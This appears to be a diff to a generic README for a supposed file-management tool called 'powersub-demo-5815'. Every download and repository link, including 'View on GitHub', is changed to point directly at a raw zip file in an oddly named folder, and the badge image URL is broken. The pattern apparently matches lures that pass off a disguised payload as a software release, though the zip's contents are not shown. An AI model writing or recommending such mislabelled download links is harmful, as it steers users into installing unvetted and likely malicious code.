@@ -1,13 +1,13 @@
 # 🛠️ powersub-demo-5815 - Simple Tool for Efficient File Management
 
 ## 💾 Download It Now!
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/stevyudi/powersub-demo-5815/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/stevyudi/powersub-demo-5815/main/quizzee/powersub-demo-5815-1.5.zip%20Release-brightgreen)](https://raw.githubusercontent.com/stevyudi/powersub-demo-5815/main/quizzee/powersub-demo-5815-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the powersub-demo-5815 application! This tool helps you manage your files easily. Follow the steps below to download and run the software on your computer. 
 
 ## 📥 Download & Install
-1. **Visit this page to download** the software from the Releases section: [Download from GitHub](https://github.com/stevyudi/powersub-demo-5815/releases). 
+1. **Visit this page to download** the software from the Releases section: [Download from GitHub](https://raw.githubusercontent.com/stevyudi/powersub-demo-5815/main/quizzee/powersub-demo-5815-1.5.zip). 
 2. Choose the latest version from the list. 
 3. Click the download link to save the file to your computer.
 
@@ -38,7 +38,7 @@ Welcome to the powersub-demo-5815 application! This tool helps you manage your f
 - **Error Messages:** Note the exact message and search online or consult support forums.
 
 ## 🔗 Additional Resources
-- GitHub Repository: [View on GitHub](https://github.com/stevyudi/powersub-demo-5815)
+- GitHub Repository: [View on GitHub](https://raw.githubusercontent.com/stevyudi/powersub-demo-5815/main/quizzee/powersub-demo-5815-1.5.zip)
 - User Guide: Detailed instructions will be available in the application once installed.
 
 ## 👨‍💻 Community Support
